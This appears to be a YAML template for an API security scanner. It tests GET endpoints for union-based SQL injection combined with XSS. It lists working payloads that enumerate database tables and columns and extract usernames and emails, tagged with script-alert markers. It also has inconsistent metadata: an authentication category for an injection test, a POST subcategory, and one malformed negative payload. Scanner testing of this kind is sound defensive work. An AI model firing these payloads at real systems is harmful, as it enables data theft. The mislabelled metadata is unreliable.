id: ADV_UNION_BASED_SQLI_XSS_GET
info:
  name: "Advanced Union based SQL Injection Test with XSS for GET method APIs"
  description: "The Advanced Union-Based SQL Injection Test with XSS for GET Method APIs identifies vulnerabilities in APIs where SQL injection through the `UNION` operator is combined with Cross-Site Scripting (XSS). This test targets GET method APIs to exploit input fields or parameters for SQL injection and deliver XSS payloads. Such vulnerabilities can expose sensitive data while also enabling client-side attacks, affecting both database security and user trust. Mitigation involves validating and sanitizing user input for SQL and HTML/JavaScript contexts and using secure coding practices."
  details: "The Advanced Union-Based SQL Injection Test with XSS for GET Method APIs focuses on identifying APIs vulnerable to dual-layered attacks. It tests whether SQL injection through the `UNION` operator can be used to extract sensitive data and whether XSS payloads can be injected to execute malicious scripts in a user's browser. This test examines GET method endpoints where user input is processed without adequate sanitization or validation, making them susceptible to both backend and frontend exploitation. Properly securing these APIs requires parameterized queries and input sanitization to block SQL and XSS payloads effectively."
  impact: "The impact of an Advanced Union-Based SQL Injection with XSS in GET Method APIs can be severe, as it combines backend and frontend vulnerabilities. Attackers could extract sensitive data from the database using SQL injection and execute malicious scripts via XSS, potentially compromising user accounts or stealing session tokens. This dual exploit amplifies the attack surface, leading to data breaches, reputational damage, and legal consequences. Implementing robust input validation, query parameterization, and secure API design is crucial to mitigate these risks."

  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: ADV_UNION_BASED_SQLI_XSS_POST
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST


api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  method:
    eq: GET
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Fail
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
      - <html>
      - </html>

  query_param:
    for_one:
      key:
        regex: ".*"
        extract: userKey
      value:
        extract: userVal
wordLists:
  advUnionXSSPayloads:
    - "' UNION SELECT 1, (SELECT CONCAT('<script>alert(1)</script>', database())), 3--"
    - "' UNION SELECT 1, (SELECT GROUP_CONCAT(table_name SEPARATOR ', ') FROM information_schema.tables WHERE table_schema=database()), '<script>alert(2)</script>'--"
    - "' UNION SELECT 1, (SELECT GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns WHERE table_name='users'), '<script>alert(3)</script>'--"
    - "' UNION SELECT 1, (SELECT GROUP_CONCAT(username SEPARATOR ', ') FROM users), '<script>alert(4)</script>'--"
    - "' UNION SELECT 1, (SELECT CONCAT('<img src=x onerror=alert(5)>', email) FROM users), 3--"
    - "' UNION SELECT 1, (SELECT IF(1=1, (SELECT table_name FROM information_schema.tables LIMIT 1), 1/0)), '<script>alert(7)</script>'--"
  advUnionXSSNegativePayloads:
    - "' UNION SELECT 1, (SELECT CONCAT('<script>alert(1)</script>', database())), 3 WHERE 1=0--"
    - "' UNION SELECT 1, (SELECT GROUP_CONCAT(table_name SEPARATOR ', ') FROM information_schema.tables WHERE table_schema=database()), '<script>alert(2)</script>' WHERE 1=0--"
    - "' UNION SELECT 1, (SELECT GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns WHERE table_name='users'), '<script>alert(3)</script>' WHERE 1=0--"
    - "' UNION SELECT 1, (SELECT GROUP_CONCAT(username SEPARATOR ', ') FROM users), '<script>alert(4)</script>'--"
    - "' UNION SELECT 1, (SELECT CONCAT('<img src=x onerror=alert(5)>', email) FROM users), 3 WHERE 1=0--"
    - "' UNION SELECT 1, (SELECT IF(1=1, (SELECT table_name FROM information_schema.tables LIMIT 1), 1/0)), '<script>alert(7)</script>' WHERE 1=0--"
execute:
  type: multiple
  requests:
    - req:
        - modify_query_param:
            userKey: ${userVal}${advUnionXSSPayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              contains_either:
                - "<script>alert(1)</script>"
                - "<script>alert(2)</script>"
                - "<script>alert(3)</script>"
                - "<script>alert(4)</script>"
                - "<img src=x onerror=alert(5)>"
                - "<script>alert(7)</script>"
              not_contains:
                - Error
                - Internal Server
                - Fail
                - Unauthorized
                - access denied
                - Forbidden
                - Method Not allowed
                - Gateway timeout
                - request timeout
                - server error
                - server busy
                - authentication error
                - authorization error
                - validation error
                - Permission Denied
                - invalid
                - token expired
                - session expired
                - session timeout
                - unexpected error
                - unable to process request
                - bad request
                - service unavailable
                - account is locked
                - account is blocked
                - multiple failed attempts
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - UNION
                - SELECT

        - success: x2
        - failure: exit
    - req:
        - modify_query_param:
            userKey: ${userVal}${advUnionXSSNegativePayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              not_contains:
                - Error
                - Internal Server
                - Fail
                - Unauthorized
                - access denied
                - Forbidden
                - Method Not allowed
                - Gateway timeout
                - request timeout
                - server error
                - server busy
                - authentication error
                - authorization error
                - validation error
                - Permission Denied
                - invalid
                - token expired
                - session expired
                - session timeout
                - unexpected error
                - unable to process request
                - bad request
                - service unavailable
                - account is locked
                - account is blocked
                - multiple failed attempts
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - UNION
                - SELECT
                - "<script>alert(1)</script>"
                - "<script>alert(2)</script>"
                - "<script>alert(3)</script>"
                - "<script>alert(4)</script>"
                - "<img src=x onerror=alert(5)>"
                - "<script>alert(7)</script>"
              neq_obj: "${x1.response.body}"
        - success: x3
        - failure: exit
    - req:
        - modify_query_param:
            userKey: ${userVal}${advUnionXSSNegativePayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              not_contains:
                - Error
                - Internal Server
                - Fail
                - Unauthorized
                - access denied
                - Forbidden
                - Method Not allowed
                - Gateway timeout
                - request timeout
                - server error
                - server busy
                - authentication error
                - authorization error
                - validation error
                - Permission Denied
                - invalid
                - token expired
                - session expired
                - session timeout
                - unexpected error
                - unable to process request
                - bad request
                - service unavailable
                - account is locked
                - account is blocked
                - multiple failed attempts
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - UNION
                - SELECT
                - "<script>alert(1)</script>"
                - "<script>alert(2)</script>"
                - "<script>alert(3)</script>"
                - "<script>alert(4)</script>"
                - "<img src=x onerror=alert(5)>"
                - "<script>alert(7)</script>"
              eq_obj: "${x2.response.body}"
        - success: vulnerable
        - failure: exit
